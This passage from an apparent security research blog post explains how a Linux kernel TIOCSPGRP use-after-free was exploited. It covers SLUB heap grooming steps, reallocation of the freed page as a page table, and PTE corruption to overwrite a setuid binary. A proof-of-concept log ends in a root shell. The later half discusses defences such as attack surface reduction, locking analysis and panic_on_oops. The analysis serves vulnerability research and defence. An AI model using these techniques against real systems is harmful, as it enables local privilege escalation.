(4)&lt;/td&gt;\n&lt;td&gt;&lt;/td&gt;\n&lt;td&gt;&lt;/td&gt;\n&lt;/tr&gt;\n&lt;tr&gt;\n&lt;td&gt;0x08&lt;/td&gt;\n&lt;td&gt;tasks[PIDTYPE_PID] (8)&lt;/td&gt;\n&lt;td&gt;rbn.rb_right (8) / rcu.func (8)&lt;/td&gt;\n&lt;td&gt;size (8)&lt;/td&gt;\n&lt;/tr&gt;\n&lt;tr&gt;\n&lt;td&gt;0x10&lt;/td&gt;\n&lt;td&gt;tasks[PIDTYPE_TGID] (8)&lt;/td&gt;\n&lt;td&gt;rbn.rb_left (8)&lt;/td&gt;\n&lt;td&gt;from (8)&lt;/td&gt;\n&lt;/tr&gt;\n&lt;tr&gt;\n&lt;td&gt;0x18&lt;/td&gt;\n&lt;td&gt;tasks[PIDTYPE_PGID] (8)&lt;/td&gt;\n&lt;td&gt;rdllink.next (8)&lt;/td&gt;\n&lt;td&gt;count (8)&lt;/td&gt;\n&lt;/tr&gt;\n&lt;tr&gt;\n&lt;td&gt;0x20&lt;/td&gt;\n&lt;td&gt;tasks[PIDTYPE_SID] (8)&lt;/td&gt;\n&lt;td&gt;rdllink.prev (8)&lt;/td&gt;\n&lt;td&gt;pad_until (8)&lt;/td&gt;\n&lt;/tr&gt;\n&lt;tr&gt;\n&lt;td&gt;0x28&lt;/td&gt;\n&lt;td&gt;rcu.next (8)&lt;/td&gt;\n&lt;td&gt;next (8)&lt;/td&gt;\n&lt;td&gt;index (8)&lt;/td&gt;\n&lt;/tr&gt;\n&lt;tr&gt;\n&lt;td&gt;0x30&lt;/td&gt;\n&lt;td&gt;rcu.func (8)&lt;/td&gt;\n&lt;td&gt;ffd.file (8)&lt;/td&gt;\n&lt;td&gt;read_pos (8)&lt;/td&gt;\n&lt;/tr&gt;\n&lt;tr&gt;\n&lt;td&gt;0x38&lt;/td&gt;\n&lt;td&gt;numbers[0].nr (4)&lt;/td&gt;\n&lt;td&gt;ffd.fd (4)&lt;/td&gt;\n&lt;td&gt;version (8)&lt;/td&gt;\n&lt;/tr&gt;\n&lt;tr&gt;\n&lt;td&gt;0x3c&lt;/td&gt;\n&lt;td&gt;[hole] (4)&lt;/td&gt;\n&lt;td&gt;nwait (4)&lt;/td&gt;\n&lt;td&gt;&lt;/td&gt;\n&lt;/tr&gt;\n&lt;tr&gt;\n&lt;td&gt;0x40&lt;/td&gt;\n&lt;td&gt;numbers[0].ns (8)&lt;/td&gt;\n&lt;td&gt;pwqlist.next (8)&lt;/td&gt;\n&lt;td&gt;lock (0x20): counter (8)&lt;/td&gt;\n&lt;/tr&gt;\n&lt;tr&gt;\n&lt;td&gt;0x48&lt;/td&gt;\n&lt;td&gt;---&lt;/td&gt;\n&lt;td&gt;pwqlist.prev (8)&lt;/td&gt;\n&lt;td&gt;&lt;/td&gt;\n&lt;/tr&gt;\n&lt;tr&gt;\n&lt;td&gt;0x50&lt;/td&gt;\n&lt;td&gt;---&lt;/td&gt;\n&lt;td&gt;ep (8)&lt;/td&gt;\n&lt;td&gt;&lt;/td&gt;\n&lt;/tr&gt;\n&lt;tr&gt;\n&lt;td&gt;0x58&lt;/td&gt;\n&lt;td&gt;---&lt;/td&gt;\n&lt;td&gt;fllink.next (8)&lt;/td&gt;\n&lt;td&gt;&lt;/td&gt;\n&lt;/tr&gt;\n&lt;tr&gt;\n&lt;td&gt;0x60&lt;/td&gt;\n&lt;td&gt;---&lt;/td&gt;\n&lt;td&gt;fllink.prev (8)&lt;/td&gt;\n&lt;td&gt;op (8)&lt;/td&gt;\n&lt;/tr&gt;\n&lt;tr&gt;\n&lt;td&gt;0x68&lt;/td&gt;\n&lt;td&gt;---&lt;/td&gt;\n&lt;td&gt;ws (8)&lt;/td&gt;\n&lt;td&gt;poll_event (4)&lt;/td&gt;\n&lt;/tr&gt;\n&lt;tr&gt;\n&lt;td&gt;0x6c&lt;/td&gt;\n&lt;td&gt;---&lt;/td&gt;\n&lt;td&gt;&lt;/td&gt;\n&lt;td&gt;[hole] (4)&lt;/td&gt;\n&lt;/tr&gt;\n&lt;tr&gt;\n&lt;td&gt;0x70&lt;/td&gt;\n&lt;td&gt;---&lt;/td&gt;\n&lt;td&gt;event.events (4)&lt;/td&gt;\n&lt;td&gt;file (8)&lt;/td&gt;\n&lt;/tr&gt;\n&lt;tr&gt;\n&lt;td&gt;0x74&lt;/td&gt;\n&lt;td&gt;---&lt;/td&gt;\n&lt;td&gt;event.data (8) &lt;strong&gt;(CONTROL)&lt;/strong&gt;&lt;/td&gt;\n&lt;td&gt;&lt;/td&gt;\n&lt;/tr&gt;\n&lt;tr&gt;\n&lt;td&gt;0x78&lt;/td&gt;\n&lt;td&gt;---&lt;/td&gt;\n&lt;td&gt;&lt;/td&gt;\n&lt;td&gt;private (8) &lt;strong&gt;(TARGET?)&lt;/strong&gt;&lt;/td&gt;\n&lt;/tr&gt;\n&lt;tr&gt;\n&lt;td&gt;0x7c&lt;/td&gt;\n&lt;td&gt;---&lt;/td&gt;\n&lt;td&gt;---&lt;/td&gt;\n&lt;td&gt;&lt;/td&gt;\n&lt;/tr&gt;\n&lt;tr&gt;\n&lt;td&gt;0x80&lt;/td&gt;\n&lt;td&gt;---&lt;/td&gt;\n&lt;td&gt;---&lt;/td&gt;\n&lt;td&gt;---&lt;/td&gt;\n&lt;/tr&gt;\n&lt;/tbody&gt;\n&lt;/table&gt;\n&lt;p&gt;In this case, reallocating the object as one of those three types didn't seem to me like a nice way forward (although it should be possible to exploit this somehow with some effort, e.g. by using &lt;code&gt;count.counter&lt;/code&gt; to corrupt the &lt;code&gt;buf&lt;/code&gt; field of &lt;code&gt;seq_file&lt;/code&gt;). Also, some systems might be using the &lt;code&gt;slab_nomerge&lt;/code&gt; kernel command line flag, which disables this merging behavior.&lt;/p&gt;\n&lt;p&gt;Another approach that I didn't look into here would have been to try to corrupt the obfuscated SLUB freelist pointer (obfuscation is implemented in &lt;code&gt;freelist_ptr()&lt;/code&gt;); but since that stores the pointer in big-endian, &lt;code&gt;count.counter&lt;/code&gt; would only effectively let us corrupt the more significant half of the pointer, which would probably be a pain to exploit.&lt;/p&gt;\n&lt;h2&gt;Attack stage: Freeing the object's page to the page allocator&lt;/h2&gt;\n&lt;p&gt;This section will refer to some internals of the SLUB allocator; if you aren't familiar with those, you may want to at least look at slides 2-4 and 13-14 of &lt;a href=\"https://events.static.linuxfound.org/sites/events/files/slides/slaballocators.pdf\"&gt;Christoph Lameter's slab allocator overview talk from 2014&lt;/a&gt;. (Note that that talk covers three different allocators; the SLUB allocator is what most systems use nowadays.)&lt;/p&gt;\n&lt;p&gt;The alternative to exploiting the UAF at the SLUB allocator level is to flush the page out to the page allocator (also called the buddy allocator), which is the last level of dynamic memory allocation on Linux (once the system is far enough into the boot process that the memblock allocator is no longer used). From there, the page can theoretically end up in pretty much any context. We can flush the page out to the page allocator with the following steps:&lt;/p&gt;\n&lt;ol&gt;\n&lt;li&gt;Instruct the kernel to pin our task to a single CPU. Both SLUB and the page allocator use per-cpu structures; so if the kernel migrates us to a different CPU in the middle, we would fail.&lt;/li&gt;\n&lt;li&gt;Before allocating the victim &lt;code&gt;struct pid&lt;/code&gt; whose refcount will be corrupted, allocate a large number of objects to drain partially-free slab pages of all their unallocated objects. If the victim object (which will be allocated in step 5 below) landed in a page that is already partially used at this point, we wouldn't be able to free that page.&lt;/li&gt;\n&lt;li&gt;Allocate around &lt;code&gt;objs_per_slab * (1+cpu_partial)&lt;/code&gt; objects - in other words, a set of objects that completely fill at least &lt;code&gt;cpu_partial&lt;/code&gt; pages, where &lt;code&gt;cpu_partial&lt;/code&gt; is the maximum length of the \"percpu partial list\". Those newly allocated pages that are completely filled with objects are not referenced by SLUB's freelists at this point because SLUB only tracks pages with free objects on its freelists.&lt;/li&gt;\n&lt;li&gt;Fill &lt;code&gt;objs_per_slab-1&lt;/code&gt; more objects, such that at the end of this step, the \"CPU slab\" (the page from which allocations will be served first) will not contain anything other than free space and fresh allocations (created in this step).&lt;/li&gt;\n&lt;li&gt;Allocate the victim object (a &lt;code&gt;struct pid&lt;/code&gt;). The victim page (the page from which the victim object came) will usually be the CPU slab from step 4, but if step 4 completely filled the CPU slab, the victim page might also be a new, freshly allocated CPU slab.&lt;/li&gt;\n&lt;li&gt;Trigger the bug on the victim object to create an uncounted reference, and free the object.&lt;/li&gt;\n&lt;li&gt;Allocate &lt;code&gt;objs_per_slab+1&lt;/code&gt; more objects. After this, the victim page will be completely filled with allocations from steps 4 and 7, and it won't be the CPU slab anymore (because the last allocation can not have fit into the victim page).&lt;/li&gt;\n&lt;li&gt;Free all allocations from steps 4 and 7. This causes the victim page to become empty, but does &lt;em&gt;not&lt;/em&gt; free the page; the victim page is placed on the percpu partial list once a single object from that page has been freed, and then stays on that list.&lt;/li&gt;\n&lt;li&gt;Free one object per page from the allocations from step 3. This adds all these pages to the percpu partial list until it reaches the limit &lt;code&gt;cpu_partial&lt;/code&gt;, at which point it will be flushed: Pages containing some in-use objects are placed on SLUB's per-&lt;a href=\"https://man7.org/linux/man-pages/man7/numa.7.html\"&gt;NUMA&lt;/a&gt;-node partial list, and pages that are completely empty are freed back to the page allocator. (We don't free &lt;em&gt;all&lt;/em&gt; allocations from step 3 because we only want the victim page to be freed to the page allocator.) Note that this step requires that every &lt;code&gt;objs_per_slab&lt;/code&gt;-th object the allocator gave us in step 3 is on a different page.&lt;/li&gt;\n&lt;/ol&gt;\n&lt;p&gt;When the page is given to the page allocator, we benefit from the page being order-0 (4 KiB, native page size): For order-0 pages, the page allocator has special freelists, one per CPU+zone+migratetype combination. Pages on these freelists are not normally accessed from other CPUs, and they don't immediately get combined with adjacent free pages to form higher-order free pages.&lt;/p&gt;\n&lt;p&gt;At this point we are able to perform use-after-free accesses to some offset inside the free victim page, using codepaths that interpret part of the victim page as a &lt;code&gt;struct pid&lt;/code&gt;. Note that at this point, we still don't know exactly at which offset inside the victim page the victim object is located.&lt;/p&gt;\n&lt;h2&gt;Attack stage: Reallocating the victim page as a pagetable&lt;/h2&gt;\n&lt;p&gt;At the point where the victim page has reached the page allocator's freelist, it's essentially game over - at this point, the page can be reused as anything in the system, giving us a broad range of options for exploitation. In my opinion, most defences that act after we've reached this point are fairly unreliable.&lt;/p&gt;\n&lt;p&gt;One type of allocation that is directly served from the page allocator and has nice properties for exploitation are page tables (which have also been &lt;a href=\"https://googleprojectzero.blogspot.com/2015/03/exploiting-dram-rowhammer-bug-to-gain.html\"&gt;used to exploit Rowhammer&lt;/a&gt;). One way to abuse the ability to modify a page table would be to enable the read/write bit in a page table entry (PTE) that maps a file page to which we are only supposed to have read access - for example, this could be used to gain write access to part of a setuid binary's &lt;code&gt;.text&lt;/code&gt; segment and overwrite it with malicious code.&lt;/p&gt;\n&lt;p&gt;We don't know at which offset inside the victim page the victim object is located; but since a page table is effectively an array of 8-byte-aligned elements of size 8 and the victim object's alignment is a multiple of that, as long as we spray all elements of the victim array, we don't need to know the victim object's offset.&lt;/p&gt;\n&lt;p&gt;To allocate a page table full of PTEs mapping the same file page, we have to:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;prepare by setting up a 2MiB-aligned memory region (because each last-level page table describes 2MiB of virtual memory) containing single-page &lt;code&gt;mmap()&lt;/code&gt; mappings of the same file page (meaning each mapping corresponds to one PTE); then&lt;/li&gt;\n&lt;li&gt;trigger allocation of the page table and fill it with PTEs by reading from each mapping&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;&lt;code&gt;struct pid&lt;/code&gt; has the same alignment as a PTE, and it starts with a 32-bit refcount, so that refcount is guaranteed to overlap the first half of a PTE, which is 64-bit. Because X86 CPUs are little-endian, incrementing the refcount field in the freed &lt;code&gt;struct pid&lt;/code&gt; increments the least significant half of the PTE - so it effectively increments the PTE. (Except for the edge case where the least significant half is &lt;code&gt;0xffffffff&lt;/code&gt;, but that's not the case here.)&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;struct pid: count | level |   tasks[0]  |   tasks[1]  |   tasks[2]  | ... \npagetable:       PTE      |     PTE     |     PTE     |     PTE     | ...\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;Therefore we can increment one of the PTEs by repeatedly triggering &lt;code&gt;get_pid()&lt;/code&gt;, which tries to increment the refcount of the freed object. This can be turned into the ability to write to the file page as follows:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;Increment the PTE by 0x42 to set the Read/Write bit and the Dirty bit. (If we didn't set the Dirty bit, the CPU would do it by itself when we write to the corresponding virtual address, so we could also just increment by 0x2 here.)&lt;/li&gt;\n&lt;li&gt;For each mapping, attempt to overwrite its contents with malicious data and ignore page faults.\n&lt;ul&gt;\n&lt;li&gt;This might throw spurious errors because of outdated TLB entries, but taking a page fault will automatically evict such TLB entries, so if we just attempt the write twice, this can't happen on the second write (modulo CPU migration, as mentioned above).&lt;/li&gt;\n&lt;li&gt;One easy way to ignore page faults is to let the kernel perform the memory write using &lt;code&gt;pread()&lt;/code&gt;, which will return &lt;code&gt;-EFAULT&lt;/code&gt; on fault.&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;If the kernel notices the Dirty bit later on, that might trigger writeback, which could crash the kernel if the mapping isn't set up for writing. Therefore, we have to reset the Dirty bit. We can't reliably decrement the PTE because &lt;code&gt;put_pid()&lt;/code&gt; inefficiently accesses &lt;code&gt;pid-&amp;gt;numbers[pid-&amp;gt;level]&lt;/code&gt; even when the refcount isn't dropping to zero, but we can increment it by an additional 0x80-0x42=0x3e, which means the final value of the PTE, compared to the initial value, will just have the additional bit 0x80 set, which the kernel ignores.&lt;/p&gt;\n&lt;p&gt;Afterwards, we launch the setuid executable (which, in the version in the pagecache, now contains the code we injected), and gain root privileges:&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;user@deb10:~/tiocspgrp$ make\nas -o rootshell.o rootshell.S\nld -o rootshell rootshell.o --nmagic\ngcc -Wall -o poc poc.c\nuser@deb10:~/tiocspgrp$ ./poc\nstarting up...\nexecuting in first level child process, setting up session and PTY pair...\nsetting up unix sockets for ucreds spam...\ndraining pcpu and node partial pages\npreparing for flushing pcpu partial pages\nlaunching child process\nchild is 1448\nucreds spam done, struct pid refcount should be lifted. starting to skew refcount...\nrefcount should now be skewed, child exiting\nchild exited cleanly\nwaiting for RCU call...\nbpf load with rlim 0x0: -1 (Operation not permitted)\nbpf load with rlim 0x1000: 452 (Success)\nbpf load success with rlim 0x1000: got fd 452\nnRCU callbacks executed\ngonna try to free the pid...\ndouble-free child died with signal 9 after dropping 9990 references (99%)\nhopefully reallocated as an L1 pagetable now\nPTE forcibly marked WRITE | DIRTY (hopefully)\nclobber via corrupted PTE succeeded in page 0, 128-byte-allocation index 3, returned 856\nclobber via corrupted PTE succeeded in page 0, 128-byte-allocation index 3, returned 856\nbash: cannot set terminal process group (1447): Inappropriate ioctl for device\nbash: no job control in this shell\nroot@deb10:/home/user/tiocspgrp# id\nuid=0(root) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(lpadmin),113(scanner),120(wireshark)\nroot@deb10:/home/user/tiocspgrp# \n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;Note that nothing in this whole exploit requires us to leak any kernel-virtual or physical addresses, partly because we have an increment primitive instead of a plain write; and it also doesn't involve directly influencing the instruction pointer.&lt;/p&gt;\n&lt;h1&gt;Defence&lt;/h1&gt;\n&lt;p&gt;This section describes different ways in which this exploit could perhaps have been prevented from working. To assist the reader, the titles of some of the subsections refer back to specific exploit stages from the section above.&lt;/p&gt;\n&lt;h2&gt;Against bugs being reachable: Attack surface reduction&lt;/h2&gt;\n&lt;p&gt;A potential first line of defense against many kernel security issues is to only make kernel subsystems available to code that needs access to them. If an attacker does not have direct access to a vulnerable subsystem &lt;em&gt;and&lt;/em&gt; doesn't have sufficient influence over a system component with access to make it trigger the issue, the issue is effectively unexploitable from the attacker's security context.&lt;/p&gt;\n&lt;p&gt;Pseudoterminals are (more or less) only necessary for interactively serving users who have shell access (or something resembling that), including:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;terminal emulators inside graphical user sessions&lt;/li&gt;\n&lt;li&gt;SSH servers&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;screen&lt;/code&gt; sessions started from various types of terminals&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;Things like webservers or phone apps won't normally need access to such devices; but there are exceptions. For example:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;a web server is used to provide a remote root shell for system administration&lt;/li&gt;\n&lt;li&gt;a phone app's purpose is to make a shell available to the user&lt;/li&gt;\n&lt;li&gt;a shell script uses &lt;code&gt;expect&lt;/code&gt; to interact with a binary that requires a terminal for input/output&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;In my opinion, the biggest limits on attack surface reduction as a defensive strategy are:&lt;/p&gt;\n&lt;ol&gt;\n&lt;li&gt;It exposes a workaround to &lt;em&gt;an implementation concern&lt;/em&gt; of the kernel (potential memory safety issues) in user-facing API, which can lead to compatibility issues and maintenance overhead - for example, from a security standpoint, I think it might be a good idea to require phone apps and systemd services to declare their intention to use the PTY subsystem at install time, but that would be an API change requiring some sort of action from application authors, creating friction that wouldn't be necessary if we were confident that the kernel is working properly. This might get especially messy in the case of software that invokes external binaries depending on configuration, e.g. a web server that needs PTY access when it is used for server administration. (This is somewhat less complicated when a benign-but-potentially-exploitable application actively applies restrictions to itself; but not every application author is necessarily willing to design a fine-grained sandbox for their code, and even then, &lt;a href=\"https://lwn.net/Articles/738694/\"&gt;there may be compatibility issues caused by libraries outside the application author's control&lt;/a&gt;.)&lt;/li&gt;\n&lt;li&gt;It can't protect a subsystem from a context that fundamentally needs access to it. (E.g. Android's &lt;code&gt;/dev/binder&lt;/code&gt; is directly accessible by Chrome renderers on Android because they have Android code running inside them.)&lt;/li&gt;\n&lt;li&gt;It means that decisions that ought to not influence the security of a system (making an API that does not grant extra privileges available to some potentially-untrusted context) essentially involve a security tradeoff.&lt;/li&gt;\n&lt;/ol&gt;\n&lt;p&gt;Still, in practice, I believe that attack surface reduction mechanisms (especially seccomp) are currently some of the most important defense mechanisms on Linux.&lt;/p&gt;\n&lt;h2&gt;Against bugs in source code: Compile-time locking validation&lt;/h2&gt;\n&lt;p&gt;The bug in &lt;code&gt;TIOCSPGRP&lt;/code&gt; was a fairly straightforward violation of a straightforward locking rule: While a &lt;code&gt;tty_struct&lt;/code&gt; is live, accessing its &lt;code&gt;pgrp&lt;/code&gt; member is forbidden unless the &lt;code&gt;ctrl_lock&lt;/code&gt; of the same &lt;code&gt;tty_struct&lt;/code&gt; is held. This rule is sufficiently simple that it wouldn't be entirely unreasonable to expect the compiler to be able to verify it - as long as you somehow inform the compiler about this rule, because figuring out the intended locking rules just from looking at a piece of code can often be hard even for humans (especially when some of the code is incorrect).&lt;/p&gt;\n&lt;p&gt;When you are starting a new project from scratch, &lt;a href=\"https://alexgaynor.net/2019/aug/12/introduction-to-memory-unsafety-for-vps-of-engineering/\"&gt;the overall best way to approach this is to use a memory-safe language&lt;/a&gt; - in other words, a language that has explicitly been designed such that the programmer has to provide the compiler with enough information about intended memory safety semantics that the compiler can automatically verify them. But for existing codebases, it might be worth looking into how much of this can be retrofitted.&lt;/p&gt;\n&lt;p&gt;Clang's &lt;a href=\"https://clang.llvm.org/docs/ThreadSafetyAnalysis.html\"&gt;Thread Safety Analysis&lt;/a&gt; feature does something vaguely like what we'd need to verify the locking in this situation:&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;$ nl -ba -s' ' thread-safety-test.cpp | sed 's|^   ||'\n  1 struct __attribute__((capability(\"mutex\"))) mutex {\n  2 };\n  3 \n  4 void lock_mutex(struct mutex *p) __attribute__((acquire_capability(*p)));\n  5 void unlock_mutex(struct mutex *p) __attribute__((release_capability(*p)));\n  6 \n  7 struct foo {\n  8     int a __attribute__((guarded_by(mutex)));\n  9     struct mutex mutex;\n 10 };\n 11 \n 12 int good(struct foo *p1, struct foo *p2) {\n 13     lock_mutex(&amp;amp;p1-&amp;gt;mutex);\n 14     int result = p1-&amp;gt;a;\n 15     unlock_mutex(&amp;amp;p1-&amp;gt;mutex);\n 16     return result;\n 17 }\n 18 \n 19 int bogus(struct foo *p1, struct foo *p2) {\n 20     lock_mutex(&amp;amp;p1-&amp;gt;mutex);\n 21     int result = p2-&amp;gt;a;\n 22     unlock_mutex(&amp;amp;p1-&amp;gt;mutex);\n 23     return result;\n 24 }\n$ clang++ -c -o thread-safety-test.o thread-safety-test.cpp -Wall -Wthread-safety\nthread-safety-test.cpp:21:22: warning: reading variable 'a' requires holding mutex 'p2-&amp;gt;mutex' [-Wthread-safety-precise]\n    int result = p2-&amp;gt;a;\n                     ^\nthread-safety-test.cpp:21:22: note: found near match 'p1-&amp;gt;mutex'\n1 warning generated.\n$ \n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;However, this does not currently work when compiling as C code because the &lt;code&gt;guarded_by&lt;/code&gt; attribute can't find the other struct member; it seems to have been designed mostly for use in C++ code. A more fundamental problem is that it also doesn't appear to have built-in support for distinguishing the different rules for accessing a struct member depending on the lifetime state of the object. For example, almost all objects with locked members will have initialization/destruction functions that have exclusive access to the entire object and can access members without locking. (The lock might not even be initialized in those states.)&lt;/p&gt;\n&lt;p&gt;Some objects also have more lifetime states; in particular, for many objects with RCU-managed lifetime, only a subset of the members may be accessed through an RCU reference without having upgraded the reference to a refcounted one beforehand. Perhaps this could be addressed by introducing a new type attribute that can be used to mark pointers to structs in special lifetime states? (For C++ code, Clang's Thread Safety Analysis simply disables all checks in all constructor/destructor functions.)&lt;/p&gt;\n&lt;p&gt;I am hopeful that, with some extensions, something vaguely like Clang's Thread Safety Analysis could be used to retrofit some level of compile-time safety against unintended data races. This will require adding a lot of annotations, in particular to headers, to document intended locking semantics; but such annotations are probably anyway necessary to enable productive work on a complex codebase. In my experience, when there are no detailed comments/annotations on locking rules, every attempt to change a piece of code you're not intimately familiar with (without introducing horrible memory safety bugs) turns into a foray into the thicket of the surrounding call graphs, trying to unravel the intentions behind the code.&lt;/p&gt;\n&lt;p&gt;The one big downside is that this requires getting the development community for the codebase on board with the idea of backfilling and maintaining such annotations. And someone has to write the analysis tooling that can verify the annotations.&lt;/p&gt;\n&lt;p&gt;At the moment, the Linux kernel does have some very coarse locking validation via &lt;code&gt;sparse&lt;/code&gt;; but this infrastructure is not capable of detecting situations where the wrong lock is used or validating that a struct member is protected by a lock. It also can't properly deal with things like conditional locking, which makes it hard to use for anything other than spinlocks/RCU. The kernel's runtime locking validation via &lt;code&gt;LOCKDEP&lt;/code&gt; is more advanced, but mostly with a focus on locking correctness of RCU pointers as well as deadlock detection (the main focus); again, there is no mechanism to, for example,automatically validate that a given struct member is only accessed under a specific lock (which would probably also be quite costly to implement with runtime validation). Also, as a runtime validation mechanism, it can't discover errors in code that isn't executed during testing (although it can combine separately observed behavior into race scenarios without ever actually observing the race).&lt;/p&gt;\n&lt;h2&gt;Against bugs in source code: Global static locking analysis&lt;/h2&gt;\n&lt;p&gt;An alternative approach to checking memory safety rules at compile time is to do it either after the entire codebase has been compiled, or with an external tool that analyzes the entire codebase. This allows the analysis tooling to perform analysis across compilation units, reducing the amount of information that needs to be made explicit in headers. This may be a more viable approach if peppering annotations everywhere across headers isn't viable; but it also reduces the utility to human readers of the code, unless the inferred semantics are made visible to them through some special code viewer. It might also be less ergonomic in the long run if changes to one part of the kernel could make the verification of other parts fail - especially if those failures only show up in some configurations.&lt;/p&gt;\n&lt;p&gt;I think global static analysis is probably a good tool for finding some subsets of bugs, and it might also help with finding the worst-case depth of kernel stacks or proving the absence of deadlocks, but it's probably less suited for proving memory safety correctness?&lt;/p&gt;\n&lt;h2&gt;Against exploit primitives: Attack primitive reduction via syscall restrictions&lt;/h2&gt;\n&lt;p&gt;(Yes, I made up that name because I thought that capturing this under \"Attack surface reduction\" is too muddy.)&lt;/p&gt;\n&lt;p&gt;Because allocator fastpaths (both in SLUB and in the page allocator) are implemented using per-CPU data structures, the ease and reliability of exploits that want to coax the kernel's memory allocators into reallocating memory in specific ways can be improved if the attacker has fine-grained control over the assignment of exploit threads to CPU cores. I'm calling such a capability, which provides a way to facilitate exploitation by influencing relevant system state/behavior, an \"attack primitive\" here. Luckily for us, Linux allows tasks to pin themselves to specific CPU cores without requiring any privilege using the &lt;code&gt;sched_setaffinity()&lt;/code&gt; syscall.&lt;/p&gt;\n&lt;p&gt;(As a different example, one primitive that can provide an attacker with fairly powerful capabilities is being able to indefinitely stall kernel faults on userspace addresses via &lt;a href=\"https://googleprojectzero.blogspot.com/2016/06/exploiting-recursion-in-linux-kernel_20.html#:~:text=pause%20the%20kernel%20thread\"&gt;FUSE&lt;/a&gt; or userfaultfd.)&lt;/p&gt;\n&lt;p&gt;Just like in the section \"Attack surface reduction\" above, an attacker's ability to use these primitives can be reduced by filtering syscalls; but while the mechanism and the compatibility concerns are similar, the rest is fairly different:&lt;/p&gt;\n&lt;p&gt;Attack primitive reduction does not normally reliably prevent a bug from being exploited; and an attacker will sometimes even be able to obtain a similar but shoddier (more complicated, less reliable, less generic, ...) primitive indirectly, for example:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;Instead of &lt;code&gt;sched_setaffinity()&lt;/code&gt;, an attacker could attempt to launch several threads, let them poll &lt;code&gt;getcpu()&lt;/code&gt; to figure out which cores they're running on, and then dispatch work to the threads as appropriate.&lt;/li&gt;\n&lt;li&gt;Instead of delaying page faults with FUSE or userfaultfd, &lt;a href=\"https://static.sched.com/hosted_files/lsseu2019/04/LSSEU2019%20-%20Exploiting%20race%20conditions%20on%20Linux.pdf#page=30\"&gt;an attacker may be able to abuse discontiguous file mappings and scheduler behavior&lt;/a&gt;.&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;Attack surface reduction is about limiting access to code that is suspected to contain exploitable bugs; in a codebase written in a memory-unsafe language, that tends to apply to pretty much the entire codebase. Attack surface reduction is often fairly opportunistic: You permit the things you need, and deny the rest by default.&lt;/p&gt;\n&lt;p&gt;Attack primitive reduction limits access to code that is suspected or known to provide (sometimes very specific) exploitation primitives. For example, one might decide to specifically forbid access to FUSE and userfaultfd for most code because of their utility for kernel exploitation, and, if one of those interfaces is truly needed, design a workaround that avoids exposing the attack primitive to userspace. This is different from attack surface reduction, where it often makes sense to permit access to any feature that a legitimate workload wants to use.&lt;/p&gt;\n&lt;p&gt;A nice example of an attack primitive reduction is the sysctl &lt;code&gt;vm.unprivileged_userfaultfd&lt;/code&gt;, &lt;a href=\"https://git.kernel.org/linus/cefdca0a86be\"&gt;which was first introduced&lt;/a&gt; so that userfaultfd can be made completely inaccessible to normal users and &lt;a href=\"https://git.kernel.org/linus/d0d4730ac2e4\"&gt;was then later adjusted&lt;/a&gt; so that users can be granted access to part of its functionality without gaining the dangerous attack primitive.  (But if you can create unprivileged user namespaces, &lt;a href=\"https://twitter.com/tehjh/status/1438330352075001856\"&gt;you can still use FUSE&lt;/a&gt; to get an equivalent effect.)&lt;/p&gt;\n&lt;p&gt;When maintaining lists of allowed syscalls for a sandboxed system component, or something along those lines, it may be a good idea to explicitly track which syscalls are explicitly forbidden for attack primitive reduction reasons, or similarly strong reasons - otherwise one might accidentally end up permitting them in the future. (I guess that's kind of similar to issues that one can run into when maintaining ACLs...)&lt;/p&gt;\n&lt;p&gt;But like in the previous section, attack primitive reduction also tends to rely on making some functionality unavailable, and so it might not be viable in all situations. For example, newer versions of Android deliberately indirectly give apps access to FUSE through &lt;a href=\"https://developer.android.com/reference/android/os/storage/StorageManager#openProxyFileDescriptor(int,%20android.os.ProxyFileDescriptorCallback,%20android.os.Handler)\"&gt;the AppFuse mechanism&lt;/a&gt;. (That API doesn't actually give an app direct access to &lt;code&gt;/dev/fuse&lt;/code&gt;, but it does forward read/write requests to the app.)&lt;/p&gt;\n&lt;h2&gt;Against oops-based oracles: Lockout or panic on crash&lt;/h2&gt;\n&lt;p&gt;The ability to recover from kernel oopses in an exploit can help an attacker compensate for a lack of information about system state. Under some circumstances, it can even serve as a binary oracle that can be used to more or less perform a binary search for a value, or something like that.&lt;/p&gt;\n&lt;p&gt;(&lt;a href=\"https://googleprojectzero.blogspot.com/2018/09/a-cache-invalidation-bug-in-linux.html\"&gt;It used to be even worse on some distributions&lt;/a&gt;, where &lt;code&gt;dmesg&lt;/code&gt; was accessible for unprivileged users; so if you managed to trigger an oops or &lt;code&gt;WARN&lt;/code&gt;, you could then grab the register states at all IRET frames in the kernel stack, which &lt;a href=\"https://googleprojectzero.blogspot.com/2018/09/a-cache-invalidation-bug-in-linux.html#:~:text=Leaking%20pointers%20from%20dmesg\"&gt;could be used to leak things like kernel pointers&lt;/a&gt;. Luckily nowadays most distributions, including &lt;a href=\"https://git.launchpad.net/~ubuntu-kernel/ubuntu/+source/linux/+git/groovy/commit/?id=f2fac7568f6acdb37de0696717f23dedc02fbe48\"&gt;Ubuntu 20.10&lt;/a&gt;, restrict &lt;code&gt;dmesg&lt;/code&gt; access.)&lt;/p&gt;\n&lt;p&gt;Android and Chrome OS nowadays set the kernel's &lt;code&gt;panic_on_oops&lt;/code&gt; flag, meaning the machine will immediately restart when a kernel oops happens. This makes it hard to use oopsing as part of an exploit, and arguably also makes more sense from a reliability standpoint - the system will be down for a bit, and it will lose its existing state, but it will also reset into a known-good state instead of continuing in a potentially half-broken state, especially if the crashing thread was holding mutexes that can never again be released, or things like that. On the other hand, if some service crashes on a desktop system, perhaps that shouldn't cause the whole system to immediately go down and make you lose unsaved state - so 